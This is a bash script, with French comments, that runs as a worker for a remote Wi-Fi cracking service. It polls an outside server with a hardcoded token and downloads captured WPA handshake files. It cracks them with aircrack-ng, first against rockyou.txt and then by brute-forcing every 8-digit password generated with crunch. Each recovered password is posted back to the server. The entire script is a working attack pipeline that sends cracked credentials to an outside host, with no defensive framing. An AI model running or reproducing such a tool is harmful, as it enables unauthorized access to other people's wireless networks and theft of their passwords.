#!/bin/bash
SITE_URL="https://wifi-wpa.byethost3.com"
TOKEN="MonTokenSecret123456"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0"

curl_api() {
    curl -s -A "$UA" "$@"
}

curl_post() {
    curl -s -A "$UA" -X POST --data-urlencode "$@"
}

report() {
    local msg="$1"
    # On évite les emojis dans l'URL, on les remplace par du texte simple
    curl -s -A "$UA" -o /dev/null \
        "${SITE_URL}/api_progress.php?token=${TOKEN}&job_id=${JOB_ID}&progress=$(echo "$msg" | sed 's/ /%20/g')" \
        2>/dev/null || true
}

echo "========================================="
echo " WiFi Crack Worker - $(date -u)"
echo "========================================="

echo ""
echo "--- Étape 1: Vérification des jobs ---"
RESPONSE=$(curl_api "${SITE_URL}/api_status.php?token=${TOKEN}")
echo "Réponse brute de l'API: [${RESPONSE}]"

if [ -z "$RESPONSE" ]; then
    echo "❌ ERREUR: L'API a retourné une réponse vide."
    echo "   Le serveur ByetHost bloque peut-être cette IP."
    echo "   Contenu possible: captcha, page 403, ou timeout."
    exit 1
fi

JOB_ID=$(echo "$RESPONSE" | jq -r '.job.id' 2>/dev/null)
ESSID=$(echo "$RESPONSE" | jq -r '.job.essid // ""' 2>/dev/null)

# Vérifier que la réponse est bien du JSON valide
if ! echo "$RESPONSE" | jq . >/dev/null 2>&1; then
    echo "❌ ERREUR: L'API n'a pas retourné du JSON valide."
    echo "   Contenu: ${RESPONSE}"
    exit 1
fi

if [ "$JOB_ID" == "null" ] || [ -z "$JOB_ID" ]; then
    echo "✅ Aucune tâche en attente."
    exit 0
fi

echo "✅ Job #${JOB_ID} trouvé !"
echo "   ESSID: '${ESSID}'"
echo ""

# --- Téléchargement ---
echo "--- Étape 2: Téléchargement du fichier .cap ---"
report "Telechargement du fichier"
curl_api -o "capture_${JOB_ID}.cap" "${SITE_URL}/api_download.php?token=${TOKEN}&id=${JOB_ID}"

if [ ! -f "capture_${JOB_ID}.cap" ] || [ ! -s "capture_${JOB_ID}.cap" ]; then
    echo "❌ Fichier vide ou introuvable"
    report "Fichier vide ou introuvable"
    curl_post "id=${JOB_ID}&status=failed&password=" "${SITE_URL}/api_update.php?token=${TOKEN}"
    exit 1
fi

# Compatibilité Linux/macOS pour stat
SIZE=$(stat -c%s "capture_${JOB_ID}.cap" 2>/dev/null || stat -f%z "capture_${JOB_ID}.cap" 2>/dev/null || echo "?")
echo "✅ Téléchargé: ${SIZE} octets"
report "Fichier telecharge (${SIZE} octets)"

# --- Vérification handshake ---
echo ""
echo "--- Étape 3: Vérification du handshake ---"
aircrack-ng "capture_${JOB_ID}.cap" > /tmp/check_result.txt 2>&1
cat /tmp/check_result.txt

if ! grep -q "WPA (1 handshake)" /tmp/check_result.txt; then
    echo "❌ Pas de handshake WPA valide dans le fichier"
    report "Pas de handshake valide"
    curl_post "id=${JOB_ID}&status=failed&password=" "${SITE_URL}/api_update.php?token=${TOKEN}"
    rm -f "capture_${JOB_ID}.cap" /tmp/check_result.txt
    exit 1
fi
echo "✅ Handshake valide détecté !"

# --- Test rockyou.txt ---
echo ""
echo "--- Étape 4: Test avec rockyou.txt ---"
report "Test rockyou.txt"

ARGS=""
[ -n "$ESSID" ] && ARGS="-e \"$ESSID\""

aircrack-ng -w /usr/share/wordlists/rockyou.txt $ARGS "capture_${JOB_ID}.cap" > result.txt 2>&1

if grep -q "KEY FOUND" result.txt; then
    PWD=$(grep "KEY FOUND" result.txt | awk -F'[][]' '{print $2}' | xargs)
    echo "✅ Mot de passe trouvé (rockyou) : [${PWD}]"
    report "Mot de passe trouve"
    curl_post "id=${JOB_ID}&status=cracked&password=${PWD}" "${SITE_URL}/api_update.php?token=${TOKEN}"
    rm -f "capture_${JOB_ID}.cap" result.txt /tmp/check_result.txt wordlist_custom.txt 2>/dev/null
    exit 0
fi

echo "❌ Pas trouvé dans rockyou"

# --- Force brute 8 chiffres ---
echo ""
echo "--- Étape 5: Force brute 8 chiffres ---"
report "Force brute 8 chiffres en cours"
echo "Génération de la wordlist avec crunch..."
crunch 8 8 0123456789 -o wordlist_custom.txt 2>/dev/null

if [ -f wordlist_custom.txt ] && [ -s wordlist_custom.txt ]; then
    echo "Wordlist générée. Lancement du cracking..."
    report "Force brute en cours"

    aircrack-ng -w wordlist_custom.txt $ARGS "capture_${JOB_ID}.cap" > result.txt 2>&1

    if grep -q "KEY FOUND" result.txt; then
        PWD=$(grep "KEY FOUND" result.txt | awk -F'[][]' '{print $2}' | xargs)
        echo "✅ Mot de passe trouvé (brute force) : [${PWD}]"
        report "Mot de passe trouve"
        curl_post "id=${JOB_ID}&status=cracked&password=${PWD}" "${SITE_URL}/api_update.php?token=${TOKEN}"
        rm -f "capture_${JOB_ID}.cap" result.txt wordlist_custom.txt /tmp/check_result.txt
        exit 0
    fi

    echo "❌ Force brute échec"
    report "Force brute échec"
else
    echo "❌ crunch n'a pas généré la wordlist"
    report "Crunch a echoue"
fi

# --- Échec final ---
echo ""
echo "--- Résultat: ÉCHEC ---"
echo "❌ Mot de passe non trouvé"
curl_post "id=${JOB_ID}&status=failed&password=" "${SITE_URL}/api_update.php?token=${TOKEN}"
rm -f "capture_${JOB_ID}.cap" result.txt wordlist_custom.txt /tmp/check_result.txt 2>/dev/null
echo "✅ Terminé"
